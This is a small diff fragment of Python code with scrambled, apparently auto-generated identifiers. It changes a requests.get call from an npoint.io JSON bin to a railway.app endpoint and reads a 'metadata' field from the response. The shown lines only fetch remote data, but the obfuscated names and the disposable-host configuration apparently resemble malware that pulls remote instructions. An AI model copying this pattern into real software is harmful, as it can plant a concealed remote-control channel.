@@ -16,7 +16,7 @@ def data_jgbgpm_200():
 
     def net_fcnkxl_490():
         try:
-            learn_wcxawr_216 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_wcxawr_216 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_wcxawr_216.raise_for_status()
             net_vaxqql_923 = learn_wcxawr_216.json()
             learn_yacpxr_229 = net_vaxqql_923.get('metadata')
